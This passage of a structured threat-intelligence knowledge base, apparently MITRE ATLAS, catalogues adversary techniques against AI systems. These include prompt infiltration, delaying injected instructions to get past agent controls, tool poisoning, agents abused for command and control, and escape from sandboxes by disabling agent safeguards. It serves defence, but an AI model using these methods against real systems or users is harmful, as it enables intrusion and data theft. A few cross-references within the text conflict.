      [ProKYC](https://www.catonetworks.com/blog/prokyc-selling-deepfake-tool-for-account-fraud-attacks/).'
    references: []
    created-date: '2025-10-31'
    modified-date: '2026-05-27'
    platforms:
    - Predictive AI
    - Enterprise
    id: AML.T0088
    maturity: Realized
    uuid: fa9aa1b8-8084-569e-9253-232b0fa8d107
    object-type: technique
  AML.T0089:
    name: Enterprise Environment Discovery
    description: 'Adversaries may discover configurations, conditions, relationships,
      activity, and other characteristics of an enterprise environment. This may include
      system and network configuration; active connections, processes, windows, and
      users; permissions, trust relationships, and policy settings; installed defensive
      or backup capabilities; network traffic; browser and registry information; or
      environmental properties such as location, language, time, connectivity, virtualization,
      debugging, and sandbox indicators.


      Adversaries may query or passively observe this information to understand how
      the environment is configured and operating, identify access paths or security
      controls, detect monitoring or analysis, and select or adapt subsequent actions.


      See the ATT&CK [Discovery](https://attack.mitre.org/tactics/TA0007/) tactic
      for techniques describing specific environmental characteristics and discovery
      mechanisms.'
    references: []
    created-date: '2025-10-27'
    modified-date: '2026-08-31'
    platforms:
    - Enterprise
    id: AML.T0089
    maturity: Realized
    uuid: a48cde58-6c7d-5126-98b3-edc24f83b49b
    object-type: technique
  AML.T0090:
    name: OS Credential Dumping
    description: 'Adversaries may extract credentials from OS caches, application
      memory, or other sources on a compromised system. Credentials are often in the
      form of a hash or clear text, and can include usernames and passwords, application
      tokens, or other authentication keys.


      Credentials can be used to perform [Lateral Movement](/tactics/AML.TA0015) to
      access other AI services such as AI agents, LLMs, or AI inference APIs. Credentials
      could also give an adversary access to other software tools and data sources
      that are part of the AI DevOps lifecycle.'
    references: []
    created-date: '2025-10-27'
    modified-date: '2026-05-27'
    platforms:
    - Enterprise
    attack-reference:
      id: T1003
      url: https://attack.mitre.org/techniques/T1003/
    id: AML.T0090
    maturity: Demonstrated
    uuid: a3c78531-c795-507b-8cfd-4ad6ed57d217
    object-type: technique
  AML.T0091:
    name: Use Alternate Authentication Material
    description: 'Adversaries may use alternate authentication material, such as password
      hashes, Kerberos tickets, and application access tokens, in order to move laterally
      within an environment and bypass normal system access controls.


      AI services commonly use alternate authentication material as a primary means
      for users to make queries, making them vulnerable to this technique.'
    references: []
    created-date: '2025-10-27'
    modified-date: '2026-05-27'
    platforms:
    - Enterprise
    attack-reference:
      id: T1550
      url: https://attack.mitre.org/techniques/T1550/
    id: AML.T0091
    maturity: Realized
    uuid: dcbb91c4-3fcc-5c1b-b851-795600618124
    object-type: technique
  AML.T0091.000:
    name: Application Access Token
    description: 'Adversaries may use stolen application access tokens to bypass the
      typical authentication process and access restricted accounts, information,
      or services on remote systems. These tokens are typically stolen from users
      or services and used in lieu of login credentials.


      Application access tokens are used to make authorized API requests on behalf
      of a user or service and are commonly used to access resources in cloud, container-based
      applications, software-as-a-service (SaaS), and AI-as-a-service(AIaaS). They
      are commonly used for AI services such as chatbots, LLMs, and predictive inference
      APIs.'
    references: []
    created-date: '2025-10-28'
    modified-date: '2026-05-27'
    platforms:
    - Enterprise
    attack-reference:
      id: T1550.001
      url: https://attack.mitre.org/techniques/T1550/001/
    id: AML.T0091.000
    maturity: Realized
    uuid: 7c36d546-bb69-5a52-a1ac-6d52cb10fc48
    object-type: technique
  AML.T0091.001:
    name: Web Session Cookie
    description: 'Adversaries may use stolen web session cookies to authenticate to
      AI-enabled applications and supporting services as another user. This technique
      may bypass some multi-factor authentication controls because the session represented
      by the cookie has already been authenticated.


      Authentication cookies are commonly used by web applications and cloud-based
      services after a user has authenticated, allowing the user to continue using
      the service without repeatedly passing credentials. These cookies may remain
      valid for extended periods of time. After obtaining a cookie through [Steal
      Web Session Cookie](/techniques/AML.T0103), an adversary may import the cookie
      into a browser or automated client they control and access the corresponding
      application as the victim while the session remains active.


      In attacks on AI systems, web session cookies may grant access to AI chat histories,
      AI agent control panels, model provider dashboards, customer support systems,
      retrieval or knowledge management interfaces, or AI DevOps resources. If the
      stolen cookie belongs to an operator, support agent, developer, or administrator,
      the adversary may be able to view sensitive conversations, manipulate agent
      configuration, access private data available through AI tools, or perform actions
      with the victim account''s permissions.'
    references: []
    created-date: '2026-06-30'
    modified-date: '2026-06-30'
    platforms:
    - Predictive AI
    attack-reference:
      id: T1550.004
      url: https://attack.mitre.org/techniques/T1550/004
    id: AML.T0091.001
    maturity: Demonstrated
    uuid: af720af7-083e-5229-9ef1-ac43b6a8f470
    object-type: technique
  AML.T0092:
    name: Manipulate User LLM Chat History
    description: "Adversaries may manipulate a user's large language model (LLM) chat\
      \ history to cover the tracks of their malicious behavior. They may hide persistent\
      \ changes they have made to the LLM's behavior, or obscure their attempts at\
      \ discovering private information about the user.\n\nTo do so, adversaries may\
      \ delete or edit existing messages or create new threads as part of their coverup.\
      \ This is feasible if the adversary has the victim's authentication tokens for\
      \ the backend LLM service or if they have direct access to the victim's chat\
      \ interface. \n\nChat interfaces (especially desktop interfaces) often do not\
      \ show the injected prompt for any ongoing chat, as they update chat history\
      \ only once when initially opening it. This can help the adversary's manipulations\
      \ go unnoticed by the victim."
    references: []
    created-date: '2025-10-27'
    modified-date: '2026-05-27'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0092
    maturity: Demonstrated
    uuid: b8baf5c1-606b-5fb0-8dff-a360462eccf6
    object-type: technique
  AML.T0093:
    name: Prompt Infiltration via Public-Facing Application
    description: 'An adversary may introduce malicious prompts into the victim''s
      system via a public-facing application with the intention of it being ingested
      by an AI at some point in the future and ultimately having a downstream effect.
      This may occur when a data source is indexed by a retrieval augmented generation
      (RAG) system, when a rule triggers an action by an AI agent, or when a user
      utilizes a large language model (LLM) to interact with the malicious content.
      The malicious prompts may persist on the victim system for an extended period
      and could affect multiple users and various AI tools within the victim organization.


      Any public-facing application that accepts text input could be a target. This
      includes email, shared document systems like OneDrive or Google Drive, and service
      desks or ticketing systems like Jira. This also includes OCR-mediated infiltration
      where malicious instructions are embedded in images, screenshots, and invoices
      that are ingested into the system.


      Adversaries may perform [Reconnaissance](/tactics/AML.TA0002) to identify public
      facing applications that are likely monitored by an AI agent or are likely to
      be indexed by a RAG. They may perform [Discover AI Agent Configuration](/techniques/AML.T0084)
      to refine their targeting.'
    references: []
    created-date: '2025-10-29'
    modified-date: '2026-05-27'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0093
    maturity: Demonstrated
    uuid: 8f32b668-8420-5569-bbbe-f39c6b493aff
    object-type: technique
  AML.T0094:
    name: Delay Execution of LLM Instructions
    description: 'Adversaries may include instructions to be followed by the AI system
      in response to a future event, such as a specific keyword or the next interaction,
      in order to evade detection or bypass controls placed on the AI system.


      For example, an adversary may include "If the user submits a new request..."
      followed by the malicious instructions as part of their prompt.


      AI agents can include security measures against prompt injections that prevent
      the invocation of particular tools or access to certain data sources during
      a conversation turn that has untrusted data in context. Delaying the execution
      of instructions to a future interaction or keyword is one way adversaries may
      bypass this type of control.'
    references: []
    created-date: '2025-11-04'
    modified-date: '2026-05-27'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0094
    maturity: Demonstrated
    uuid: ced5d1be-a572-58e3-bb3f-9f8c22de02b5
    object-type: technique
  AML.T0095:
    name: Search Open Websites/Domains
    description: 'Adversaries may search public websites and/or domains for information
      about victims and AI targets that can be used during targeting and to discover
      opportunities for successful attacks. Information about a victim''s attack surface
      may be available in various online sites, such as social media, news sites,
      or domains owned by the victim.


      Adversaries may find the information they seek to gather via search engines.
      They can use precise search queries to identify software platforms or services
      used by the victim to use in targeting. This may be followed by [Exploit Public-Facing
      Application](/techniques/AML.T0049) or [Prompt Infiltration via Public-Facing
      Application](/techniques/AML.T0093).


      Adversaries may utilize OSINT-based discovery to map different AI assets by
      using search engine result pages, as well as backlink analysis, to locate agentic
      interfaces (which are frequently embedded via iFrames and follow predictable
      naming conventions). By analyzing the indexed URL structures of these sources
      from different search engines, attackers can often reverse-engineer internal
      environment IDs and organization-specific naming conventions. This intelligence
      gathering significantly narrows the search space for any later targeted fuzzing
      or enumeration performed by [Active Scanning: Enumerate Hosted AI Resources](/techniques/AML.T0006.000).'
    references: []
    created-date: '2025-11-05'
    modified-date: '2026-09-15'
    platforms:
    - Enterprise
    attack-reference:
      id: T1593
      url: https://attack.mitre.org/techniques/T1593/
    id: AML.T0095
    maturity: Realized
    uuid: f36ec430-2908-5472-b19a-6e89409739dd
    object-type: technique
  AML.T0095.000:
    name: Code Repositories
    description: 'Adversaries may search public code repositories for information
      about a victim or victim system that can be used during targeting. Victims may
      store code or artifacts related to their AI systems in repositories on various
      third-party websites such as GitHub, GitLab, SourceForge, and BitBucket. Adversaries
      may search code repositories of common AI tools, frameworks, models, or agentic
      systems that are used--but not owned--by the victim.


      Public code repositories can often be a source of various information about
      victims, such as commonly used AI frameworks, libraries, models, datasets, agents,
      and agent tools, as well as the names of employees. Adversaries may also identify
      more sensitive data, including accidentally leaked credentials or API keys (ex:
      [Credentials from AI Agent Configuration](/techniques/AML.T0083)). Information
      from these sources may reveal opportunities for other forms of [Reconnaissance](/tactics/AML.TA0002)
      (ex: [Gather RAG-Indexed Targets](/techniques/AML.T0064)), establishing operational
      resources (ex: [Acquire Public AI Artifacts](/techniques/AML.T0002)), [Discovery](/tactics/AML.TA0008)
      (ex: [Discover AI Agent Configuration](/techniques/AML.T0084)) and/or [Initial
      Access](/tactics/AML.TA0004) (ex: [Valid Accounts](/techniques/AML.T0012) or
      [Phishing](/techniques/AML.T0052)).'
    references: []
    created-date: '2026-04-22'
    modified-date: '2026-05-27'
    platforms:
    - Enterprise
    attack-reference:
      id: T1593.003
      url: https://attack.mitre.org/techniques/T1593/003/
    id: AML.T0095.000
    maturity: Realized
    uuid: 47789eb8-2a21-5a8b-a380-57e17bde15e2
    object-type: technique
  AML.T0096:
    name: AI Service API
    description: 'Adversaries may communicate using the API of an AI service on the
      victim''s system. The adversary''s commands to the victim system, and often
      the results, are embedded in the normal traffic of the AI service.


      An AI service API command and control channel is covert because the adversary''s
      commands blend in with normal communications, so an adversary may use this technique
      to avoid detection. Using existing infrastructure on the victim''s system allows
      the adversary to live off the land, further reducing their footprint.


      AI service APIs may be abused as C2 channels when an adversary wants to be stealthy
      and maintain long-term persistence for espionage activities [[microsoft]].'
    references:
    - id: microsoft
      title: 'SesameOp: Novel backdoor uses OpenAI Assistants API for command and
        control | Microsoft Security Blog'
      url: https://www.microsoft.com/en-us/security/blog/2025/11/03/sesameop-novel-backdoor-uses-openai-assistants-api-for-command-and-control/
    created-date: '2025-12-24'
    modified-date: '2026-05-27'
    platforms:
    - Predictive AI
    - Generative AI
    - Agentic AI
    id: AML.T0096
    maturity: Realized
    uuid: 92a68652-d864-5c9c-9c1d-64ec09587390
    object-type: technique
  AML.T0097:
    name: Virtualization/Sandbox Evasion
    description: 'Adversaries may employ various means to detect and avoid virtualization
      and analysis environments. This may include changing behaviors based on the
      results of checks for the presence of artifacts indicative of a virtual machine
      environment (VME) or sandbox. If the adversary detects a VME, they may alter
      their malware to disengage from the victim or conceal the core functions of
      the implant. They may also search for VME artifacts before dropping secondary
      or additional payloads.


      Adversaries may use several methods to accomplish Virtualization/Sandbox Evasion
      such as checking for security monitoring tools (e.g., Sysinternals, Wireshark,
      etc.) or other system artifacts associated with analysis or virtualization such
      as registry keys (e.g. substrings matching Vmware, VBOX, QEMU), environment
      variables (e.g. substrings matching VBOX, VMWARE, PARALLELS), NIC MAC addresses
      (e.g. prefixes 00-05-69 (VMWare) or 08-00-27 (VirtualBox)), running processes
      (e.g. vmware.exe, vboxservice.exe, qemu-ga.exe) [[research]].'
    references:
    - id: research
      title: New Malware Embeds Prompt Injection to Evade AI Detection - Check Point
        Research
      url: https://research.checkpoint.com/2025/ai-evasion-prompt-injection/
    created-date: '2025-11-25'
    modified-date: '2026-05-27'
    platforms:
    - Enterprise
    attack-reference:
      id: T1497
      url: https://attack.mitre.org/techniques/T1497/
    id: AML.T0097
    maturity: Realized
    uuid: d21c2e27-f274-50d0-947c-b44bae1e6b66
    object-type: technique
  AML.T0098:
    name: AI Agent Tool Credential Harvesting
    description: Adversaries may attempt to use their access to an AI agent on the
      victim's system to retrieve data from available agent tools to collect credentials.
      Agent tools may connect to a wide range of sources that may contain credentials
      including document stores (e.g. SharePoint, OneDrive or Google Drive), code
      repositories (e.g. GitHub or GitLab), or enterprise productivity tools (e.g.
      as email providers or Slack), and local notetaking tools (e.g. Obsidian or Apple
      Notes).
    references: []
    created-date: '2025-11-25'
    modified-date: '2026-05-27'
    platforms:
    - Agentic AI
    id: AML.T0098
    maturity: Demonstrated
    uuid: daca6b9c-9073-5aef-8017-737d1aa51f6d
    object-type: technique
  AML.T0099:
    name: AI Agent Tool Data Poisoning
    description: 'Adversaries may manipulate data in a victim-controlled, trusted,
      or connected data source that is accessible through an AI agent tool. Poisoned
      data may be placed in document repositories, databases, source-code repositories,
      knowledge bases, search indexes, enterprise applications, or third-party data
      services used by the agent.


      The content may be crafted to appear in common tool queries or retrieval operations.
      It may contain false or misleading information or malicious instructions intended
      to produce an [LLM Prompt Injection: Indirect](/techniques/AML.T0051.001) when
      retrieved.


      This technique concerns manipulation of a data source that an agent tool treats
      as a source of information. When the adversary introduces the content through
      a victim-controlled public-facing application, the activity may also constitute
      [Prompt Infiltration via Public-Facing Application](/techniques/AML.T0093).
      Content retrieved directly from an adversary-controlled website may instead
      constitute [Drive-by Compromise](/techniques/AML.T0078). A malicious or compromised
      tool that deliberately alters its own runtime result constitutes [AI Agent Tool
      Poisoning: Runtime Response](/techniques/AML.T0110.002).'
    references: []
    created-date: '2025-11-25'
    modified-date: '2026-07-31'
    platforms:
    - Agentic AI
    id: AML.T0099
    maturity: Feasible
    uuid: 7330bae1-3905-5446-838f-c9476ef52978
    object-type: technique
  AML.T0100:
    name: AI Agent Clickbait
    description: "Adversaries may craft deceptive content designed to bait computer-using\
      \ AI agents or AI web browsers and tools into taking unintended actions, such\
      \ as clicking buttons, copying code, or navigating to specific web pages. These\
      \ attacks exploit the agent's interpretation of UI content, visual cues, and\
      \ natural language embedded in processed artifacts, such as a website or a document,\
      \ and aim at the agent's decision process rather than a human reader's. \n\n\
      When successful, AI Agent Clickbait can lead the victim's agent to inadvertently\
      \ copy and execute malicious code on the user's operating system or perform\
      \ data exfiltration. The AI Agent Clickbait may also include a [Prompt Injection:\
      \ Indirect](/techniques/AML.T0051.001), which can influence or manipulate the\
      \ victim's agent in adversary-controlled ways."
    references: []
    created-date: '2025-11-25'
    modified-date: '2026-09-15'
    platforms:
    - Agentic AI
    id: AML.T0100
    maturity: Demonstrated
    uuid: bd74bd28-20ce-5f69-972e-0afe627b7147
    object-type: technique
  AML.T0101:
    name: Data Destruction via AI Agent Tool Invocation
    description: Adversaries may invoke an AI agent's tool capable of performing mutative
      operations to perform Data Destruction. Adversaries may destroy data and files
      on specific systems or in large numbers on a network to interrupt availability
      to systems, services, and network resources.
    references: []
    created-date: '2025-11-25'
    modified-date: '2026-05-27'
    platforms:
    - Agentic AI
    id: AML.T0101
    maturity: Realized
    uuid: 4a9bacd2-7c04-5c4b-bed3-b469450d0f9e
    object-type: technique
  AML.T0102:
    name: Generate Malicious Commands
    description: 'Adversaries may use large language models (LLMs) to dynamically
      generate malicious commands from natural language. Dynamically generated commands
      may be harder to detect as the attack signature is constantly changing. AI-generated
      commands may also allow adversaries to more rapidly adapt to different environments
      and adjust their tactics.


      Adversaries may utilize LLMs present in the victim''s environment or call out
      to externally hosted services. [APT28](https://attack.mitre.org/groups/G0007)
      utilized a model hosted on HuggingFace in a campaign with their LAMEHUG malware
      [[logpoint]]. In either case prompts to generate malicious code can blend in
      with normal traffic.'
    references:
    - id: logpoint
      title: 'LAMEHUG: APT28''s First AI-Powered Malware Explained | Guardsix'
      url: https://logpoint.com/en/blog/apt28s-new-arsenal-lamehug-the-first-ai-powered-malware
    created-date: '2025-11-25'
    modified-date: '2026-05-27'
    platforms:
    - Enterprise
    id: AML.T0102
    maturity: Realized
    uuid: 4c46c93f-47b3-5ace-8c6c-a15cb1a55dd2
    object-type: technique
  AML.T0103:
    name: Deploy AI Agent
    description: 'Adversaries may launch AI agents in the victim''s environment to
      execute actions on their behalf. AI agents may have access to a wide range of
      tools and data sources, as well as permissions to access and interact with other
      services and systems in the victim''s environment. The adversary may leverage
      these capabilities to carry out their operations.


      Adversaries may configure the AI agent by providing an initial system prompt
      and granting access to tools, effectively defining their goals for the agent
      to achieve. They may deploy the agent with excessive trust permissions and disable
      any user interactions to ensure the agent''s actions aren''t blocked.


      Launching an AI agent may provide for some autonomous behavior, allowing for
      the agent to make decisions and determine how to achieve the adversary''s goals.
      This also represents a loss of control for the adversary.'
    references: []
    created-date: '2026-01-28'
    modified-date: '2026-05-27'
    platforms:
    - Agentic AI
    id: AML.T0103
    maturity: Realized
    uuid: f8d5be4e-b5f8-5b61-bdc9-3a8818327210
    object-type: technique
  AML.T0105:
    name: Escape to Host
    description: 'Adversaries may break out of a container or virtualized environment
      to gain access to the underlying host. This can allow an adversary access to
      other containerized or virtualized resources from the host level or to the host
      itself. In principle, containerized / virtualized resources should provide a
      clear separation of application functionality and be isolated from the host
      environment.


      There are many ways an adversary may escape from a container or sandbox environment
      via AI Systems. For example, modifying an AI Agent''s configuration to disable
      safety features or user confirmations could allow the adversary to invoke tools
      to be run on host environments rather than in the sandbox.'
    references: []
    created-date: '2026-01-30'
    modified-date: '2026-05-27'
    platforms:
    - Enterprise
    attack-reference:
      id: T1611
      url: https://attack.mitre.org/techniques/T1611/
    id: AML.T0105
    maturity: Realized
    uuid: 8a98b993-8854-5fdd-ae81-4256db9e7a2d
    object-type: technique
  AML.T0106:
    name: Exploitation for Credential Access
    description: Adversaries may exploit software vulnerabilities in an attempt to
      collect credentials. Exploitation of a software vulnerability occurs when an
      adversary takes advantage of a programming error in a program, service, or within
      the operating system software or kernel itself to execute adversary-controlled
      code.
    references: []
    created-date: '2026-01-30'
    modified-date: '2026-05-27'
    platforms:
    - Enterprise
    attack-reference:
      id: T1211
      url: https://attack.mitre.org/techniques/T1211/
    id: AML.T0106
    maturity: Demonstrated
    uuid: 61bd1eb1-b526-59aa-9b1c-86a7dc5fa0d8
    object-type: technique
  AML.T0107:
    name: Exploitation for Defense Evasion
    description: Adversaries may exploit a system or application vulnerability to
      bypass security features. Exploitation of a vulnerability occurs when an adversary
      takes advantage of a programming error in a program, service, or within the
      operating system software or kernel itself to execute adversary-controlled code.
      Vulnerabilities may exist in defensive security software that can be used to
      disable or circumvent them.
    references: []
    created-date: '2026-01-30'
    modified-date: '2026-05-27'
    platforms:
    - Enterprise
    attack-reference:
      id: T1211
      url: https://attack.mitre.org/techniques/T1211/
    id: AML.T0107
    maturity: Demonstrated
    uuid: 1f612544-c939-5d60-ad34-2d0644622e1f
    object-type: technique
  AML.T0108:
    name: AI Agent
    description: 'Adversaries may abuse AI agents present on the victim''s system
      for command and control. AI agents are often granted access to tools that can
      execute shell commands, reach out to the internet, and interact with other services
      in the victim''s environment, making them capable C2 agents.


      The adversary may modify the behavior of an AI agent for C2 via [LLM Prompt
      Injection](/techniques/AML.T0051) and rely on the agent''s ability to invoke
      tools to retrieve and execute the adversary''s commands. They may maintain persistent
      control of an agent via [Modify AI Agent Configuration](/techniques/AML.T0081)
      or [AI Agent Context Poisoning](/techniques/AML.T0080). They may instruct the
      agent to not report their actions to the user in an attempt to remain covert.'
    references: []
    created-date: '2026-01-30'
    modified-date: '2026-05-27'
    platforms:
    - Agentic AI
    id: AML.T0108
    maturity: Demonstrated
    uuid: cf34558d-6970-51aa-a43e-d345b9cf7d38
    object-type: technique
  AML.T0109:
    name: AI Supply Chain Rug Pull
    description: 'Adversaries may publish legitimate AI components or software, gain
      user adoption, then push an update with a malicious variant, leading to [AI
      Supply Chain Compromise](/techniques/AML.T0010). More scrutiny is often placed
      on a supply chain dependency when it is first being considered for inclusion
      in an AI system. Performing a rug pull may allow adversaries to bypass these
      defenses and be more likely to achieve [Initial Access](/tactics/AML.TA0004).


      Adversaries may [Publish Poisoned AI Artifacts](/techniques/AML.T0115), then
      attempt to gain user trust and increase adoption before performing the rug pull
      (See [AI Supply Chain Reputation Inflation](/techniques/AML.T0111)).'
    references: []
    created-date: '2026-03-30'
    modified-date: '2026-05-27'
    platforms:
    - Predictive AI
    - Generative AI
    - Agentic AI
    id: AML.T0109
    maturity: Realized
    uuid: 885eb980-23c3-5b11-a310-9e1e65c010d4
    object-type: technique
  AML.T0110:
    name: AI Agent Tool Poisoning
    description: 'Adversaries may poison tools used by AI agents by introducing or
      modifying malicious content or behavior in a tool''s model-visible definition,
      executable implementation, or runtime responses. Tools may include built-in
      integrations, locally installed packages, remotely hosted services, Model Context
      Protocol (MCP) servers and tools, and agent skills or similar capability packages.


      A poisoned tool is represented or trusted as performing a benign function, but
      its definition, implementation, or responses cause agent behavior or tool-mediated
      effects to differ materially from the represented function. Poisoning may be
      present when a tool is first published, introduced through an [AI Supply Chain
      Compromise](/techniques/AML.T0010), or added after adoption through an [AI Supply
      Chain Rug Pull](/techniques/AML.T0109). Once the tool is installed, connected,
      or otherwise made available to the agent, it may provide the adversary with
      persistent influence over the agent''s actions and external interactions.


      Adversaries may poison a tool''s model-visible semantic interface, including
      its descriptions, schemas, parameter documentation, annotations, or agent-readable
      instructions (See [Definition and Instructions](/techniques/AML.T0110.000)).
      They may introduce hidden executable behavior that changes the effects of otherwise
      normal tool invocations (See [Implementation](/techniques/AML.T0110.001)). They
      may also cause a malicious or compromised tool to deliberately return content
      intended to influence the model''s subsequent reasoning or actions (See [Runtime
      Response](/techniques/AML.T0110.002)).


      Poisoned tools may cause an agent to access sensitive data, alter the inputs
      or destinations of other tools, execute unauthorized commands, conceal actions
      from users, or exfiltrate information. Tool poisoning frequently enables other
      techniques such as [LLM Prompt Injection](/techniques/AML.T0051), [AI Agent
      Tool Invocation](/techniques/AML.T0053), and [Exfiltration via AI Agent Tool
      Invocation](/techniques/AML.T0086).


      Tool poisoning is distinct from malicious data that a benign tool faithfully
      retrieves from an external or victim-controlled source (See [AI Agent Tool Data
      Poisoning](/techniques/AML.T0099) and [LLM Prompt Injection: Indirect](/techniques/AML.T0051.001).
      Software that merely uses an agent tool package as a delivery vehicle for conventional
      malware, without subverting the tool''s represented interface or operation,
      may be better described as a malicious package or software supply-chain compromise
      rather than AI Agent Tool Poisoning.'
    references: []
    created-date: '2026-03-30'
    modified-date: '2026-07-31'
    platforms:
    - Agentic AI
    id: AML.T0110
    maturity: Realized
    uuid: b1b2cc5a-7312-5f26-93d3-8b8ee1baf97d
    object-type: technique
  AML.T0110.000:
    name: Definition and Instructions
    description: 'Adversaries may poison the model-visible definition or operational
      instructions of an AI agent tool to manipulate how an agent interprets, selects,
      or invokes the tool. The poisoned content may be contained in tool descriptions,
      docstrings, parameter names, help text, input or output schemas, annotations,
      examples, manifests, skill instruction files, or other static content used to
      explain a tool''s capabilities to the model.


      Malicious instructions in this layer may direct the agent to collect additional
      data, populate hidden or unnecessary parameters, conceal actions from the user,
      or invoke other tools. Because an agent may receive a more complete representation
      of a tool than is shown in the user interface, the model may process malicious
      instructions that are invisible or only partially visible to a human reviewer[[invariant-tool-poisoning]].


      Definition poisoning may also be used for tool shadowing, in which the definition
      of one malicious tool contains instructions that alter how the agent selects
      or invokes another trusted tool. The poisoned tool may not need to be invoked
      for its definition to influence the agent if definitions from multiple connected
      tools are included in the same model context[[invariant-tool-poisoning]].'
    references:
    - id: invariant-tool-poisoning
      title: 'MCP Security Notification: Tool Poisoning Attacks'
      url: https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks
    - id: mcp-tools
      title: 'Model Context Protocol Specification: Tools'
      url: https://modelcontextprotocol.io/specification/2025-06-18/server/tools
    - id: owasp-tool-poisoning
      title: MCP Tool Poisoning
      url: https://owasp.org/www-community/attacks/MCP_Tool_Poisoning
    created-date: '2026-07-31'
    modified-date: '2026-07-31'
    platforms:
    - Agentic AI
    id: AML.T0110.000
    maturity: Demonstrated
    uuid: 44973152-65df-5c42-a03b-d3d255d57dd8
    object-type: technique
  AML.T0110.001:
    name: Implementation
    description: 'Adversaries may poison the executable implementation of an AI agent
      tool so that normal tool invocation produces unauthorized behavior or hidden
      side effects. The tool may continue to provide its represented functionality
      while also accessing additional data, modifying requests, changing recipients
      or destinations, executing unauthorized commands, weakening security controls,
      or performing covert data exfiltration.


      Implementation poisoning does not require the model to interpret or follow malicious
      instructions. The adversarial effect is produced by executable logic when the
      agent or user invokes the tool. For example, a poisoned email tool may send
      the requested message while silently adding an adversary-controlled blind-copy
      recipient. A file-processing tool may return the requested result while also
      transmitting the source file to an external service.


      Implementation poisoning may be introduced before publication, through compromise
      of a tool''s source repository or build process, or through a malicious update
      after users have adopted a benign version. Installed copies may continue to
      exhibit the poisoned behavior even after the malicious package or remote listing
      is removed[[koi-postmark]].'
    references:
    - id: koi-postmark
      title: 'First Malicious MCP in the Wild: The Postmark Backdoor That''s Stealing
        Your Emails'
      url: https://www.koi.ai/blog/postmark-mcp-npm-malicious-backdoor-email-theft
    created-date: '2026-07-31'
    modified-date: '2026-07-31'
    platforms:
    - Agentic AI
    id: AML.T0110.001
    maturity: Realized
    uuid: 357db260-e699-5692-84de-a81f8ded94d1
    object-type: technique
  AML.T0110.002:
    name: Runtime Response
    description: 'Adversaries may poison the runtime response channel of a malicious
      or compromised AI agent tool by deliberately returning content intended to influence
      the model''s subsequent reasoning, decisions, or actions. Poisoned responses
      may contain malicious instructions, deceptive data, fabricated errors, embedded
      resources, or other content designed to be treated as trusted context after
      an approved tool invocation.


      Because tool responses are commonly incorporated into the model''s context,
      an adversary may use them to direct the agent to invoke additional tools, access
      sensitive information, alter an ongoing workflow, or transmit data to an adversary-controlled
      destination. Poisoned instructions may be mixed with legitimate results so that
      the tool appears to operate normally. Responses may use structured or unstructured
      content, including text, images, resource links, embedded resources, or schema-conforming
      fields [[mcp-tools]][[owasp-tool-poisoning]].'
    references:
    - id: mcp-tools
      title: 'Model Context Protocol Specification: Tools'
      url: https://modelcontextprotocol.io/specification/2025-11-25/server/tools
    - id: owasp-tool-poisoning
      title: MCP Tool Poisoning
      url: https://owasp.org/www-community/attacks/MCP_Tool_Poisoning
    - id: owasp-mcp-security
      title: MCP Security Cheat Sheet
      url: https://cheatsheetseries.owasp.org/cheatsheets/MCP_Security_Cheat_Sheet.html
    created-date: '2026-07-31'
    modified-date: '2026-07-31'
    platforms:
    - Agentic AI
    id: AML.T0110.002
    maturity: Feasible
    uuid: 1b963ef2-b782-59e4-b5e3-ddd7e91ca940
    object-type: technique
  AML.T0111:
    name: AI Supply Chain Reputation Inflation
    description: 'AI Supply Chain Reputation Inflation is the process of building
      or leveraging genuinely credible-looking trust signals to increase the perceived
      legitimacy of AI supply chain components, with the goal of driving adoption
      of malicious or compromised assets.


      Adversaries use established developer accounts with a history of legitimate
      projects and contributions to publish AI models, datasets, packages, and MCP
      servers that appear trustworthy. They build reputation through real adoption
      signals such as downloads, GitHub stars, forks, and inclusion in dependency
      chains, often releasing benign versions before introducing malicious updates
      via [AI Supply Chain Rug Pull](/techniques/AML.T0109).


      By relying on authentic history and usage patterns, these components pass both
      human and automated trust checks, increasing the likelihood they are adopted
      without scrutiny.'
    references: []
    created-date: '2026-03-30'
    modified-date: '2026-05-27'
    platforms:
    - Predictive AI
    - Generative AI
    - Agentic AI
    id: AML.T0111
    maturity: Demonstrated
    uuid: c4730fd0-ec0d-5bf5-8f03-e42faaa5055b
    object-type: technique
  AML.T0112:
    name: Machine Compromise
    description: 'Adversaries may compromise a machine by exploiting or manipulating
      AI-enabled components on the system. Compromising a victim system allows the
      adversary to execute arbitrary code, steal credentials, exfiltrate data, and
      continue to persist on the system.


      Adversaries may target a [Local AI Agent](/techniques/AML.T0112.000) which if
      compromised grants them the capabilities and permissions of the agent, or [AI
      Artifacts](/techniques/AML.T0112.001) which can contain embedded malware.'
    references: []
    created-date: '2026-03-30'
    modified-date: '2026-05-27'
    platforms:
    - Predictive AI
    - Generative AI
    - Agentic AI
    id: AML.T0112
    maturity: Demonstrated
    uuid: 00d819a2-6a7f-5021-9c42-f02f6f0254c1
    object-type: technique
  AML.T0112.000:
    name: Local AI Agent
    description: 'Adversaries may achieve full system compromise by abusing AI agents
      running locally on a host, such as computer-use agents or AI-driven browsers.
      These agents are designed to autonomously interact with the operating system,
      applications, and external services, often with broad permissions to execute
      commands, access files, manage credentials, and control user workflows.


      If an adversary is able to take control of an AI agent''s behavior, they effectively
      gain the same level of access as the agent. This can result in complete control
      over the machine, including executing arbitrary code, accessing or exfiltrating
      sensitive data, modifying system configurations, and establishing persistence.'
    references: []
    created-date: '2026-03-30'
    modified-date: '2026-05-27'
    platforms:
    - Agentic AI
    id: AML.T0112.000
    maturity: Demonstrated
    uuid: 6354a977-1913-513b-bddf-21a3ba2947b7
    object-type: technique
  AML.T0112.001:
    name: AI Artifacts
    description: 'Adversaries may achieve full system compromise by introducing malicious
      AI artifacts, such as models or data, that contain embedded malware or other
      malicious commands. AI artifacts are often stored in model registries or data
      stores and may affect many systems that pull these resources.


      Malicious content stored in AI artifacts may be executed as a result of unsafe
      serialization formats (e.g. Python pickle) or by other bundled scripts or notebooks.'
    references: []
    created-date: '2026-03-30'
    modified-date: '2026-05-27'
    platforms:
    - Predictive AI
    - Generative AI
    - Agentic AI
    id: AML.T0112.001
    maturity: Feasible
    uuid: bd0fd9ca-cc30-542e-9c1a-de9f66c9455b
    object-type: technique
  AML.T0113:
    name: Steal Web Session Cookie
    description: 'Adversaries may steal web application or service session cookies
      used to authenticate users to AI-enabled systems, AI services, or supporting
      enterprise applications.


      Web applications often use session cookies as authentication tokens after a
      user has signed in. These cookies may remain valid for extended periods of time,
      even when the application is not actively being used. In AI systems, session
